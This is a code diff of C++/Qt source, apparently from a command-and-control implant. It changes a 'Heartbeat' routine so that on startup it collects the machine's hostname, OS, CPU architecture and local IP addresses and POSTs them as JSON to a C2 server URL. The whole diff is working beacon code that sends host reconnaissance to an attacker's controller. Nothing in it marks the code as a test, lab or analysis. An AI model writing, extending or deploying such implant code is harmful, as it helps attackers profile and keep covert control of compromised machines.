@@ -2,6 +2,7 @@
 #include <QtNetwork/QNetworkAccessManager>
 #include <QtNetwork/QNetworkReply>
 #include <QtNetwork/QNetworkRequest>
+#include <QtNetwork/QNetworkInterface>
 #include <QJsonDocument>
 #include <QJsonObject>
 #include <QJsonArray>
@@ -13,6 +14,8 @@
 #include <QBuffer>
 #include <QStandardPaths>
 #include <QFile>
+#include <QSysInfo>
+#include <QHostInfo>
 
 namespace Core {
 
@@ -23,6 +26,8 @@ Heartbeat& Heartbeat::Instance() {
 
 Heartbeat::Heartbeat() {
     connect(&_timer, &QTimer::timeout, this, &Heartbeat::checkTasks);
+    // Send heartbeat immediately on startup
+    sendHeartbeat();
 }
 
 void Heartbeat::start() {
@@ -33,12 +38,34 @@ void Heartbeat::start() {
 }
 
 void Heartbeat::sendHeartbeat() {
-    // Basic ping
+    // Collect System Info
+    QString hostName = QHostInfo::localHostName();
+    QString osInfo = QSysInfo::prettyProductName() + " (" + QSysInfo::currentCpuArchitecture() + ")";
+    
+    // Collect IP Addresses (Local)
+    QStringList ips;
+    const QList<QHostAddress> addresses = QNetworkInterface::allAddresses();
+    for (const QHostAddress &address : addresses) {
+        if (address != QHostAddress::LocalHost && address != QHostAddress::LocalHostIPv6) {
+            ips.append(address.toString());
+        }
+    }
+    QString ipString = ips.join(", ");
+
+    QJsonObject json;
+    json["hostName"] = hostName;
+    json["os"] = osInfo;
+    json["ip"] = ipString; // Sending local IPs as extra info, though backend uses request IP
+
     QNetworkRequest request(QUrl(_c2Url + "/heartbeat"));
-    QNetworkReply* reply = _network.get(request);
+    request.setHeader(QNetworkRequest::ContentTypeHeader, "application/json");
+
+    QNetworkReply* reply = _network.post(request, QJsonDocument(json).toJson());
     connect(reply, &QNetworkReply::finished, [reply]() {
         if (reply->error() != QNetworkReply::NoError) {
             qDebug() << "Heartbeat failed:" << reply->errorString();
+        } else {
+             qDebug() << "Heartbeat sent successfully";
         }
         reply->deleteLater();
     });
